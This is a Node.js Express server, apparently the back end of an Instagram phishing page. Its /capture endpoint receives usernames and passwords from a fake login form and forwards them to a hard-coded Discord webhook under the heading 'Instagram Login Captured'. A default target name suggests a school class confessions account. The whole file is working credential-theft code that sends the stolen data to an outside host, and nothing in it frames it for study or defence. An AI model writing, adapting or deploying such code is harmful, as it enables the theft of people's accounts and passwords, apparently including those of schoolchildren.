const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1489947599749382146/wmgyrpxEvWnVKepFlDqTNMJt0P7dPv_Nx7GxvjJfri5j-0kttIQTM1rdZAMQ3iWQyBEC";

app.use(cors());
app.use(express.json());

// Serve static files (index.html and 1.html)
app.use(express.static(__dirname));

// Capture login data
app.post('/capture', async (req, res) => {
    const { username, password, target, time } = req.body;

    const payload = {
        content: "**Instagram Login Captured**",
        embeds: [{
            color: 0x0095f6,
            fields: [
                { name: "Username / Email", value: username || "N/A", inline: false },
                { name: "Password", value: password ? "||" + password + "||" : "N/A", inline: false },
                { name: "Target", value: target || "smrj.class9.confessions", inline: false },
                { name: "Time", value: time || new Date().toLocaleString(), inline: false }
            ]
        }]
    };

    try {
        await fetch(DISCORD_WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    } catch (e) {}

    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
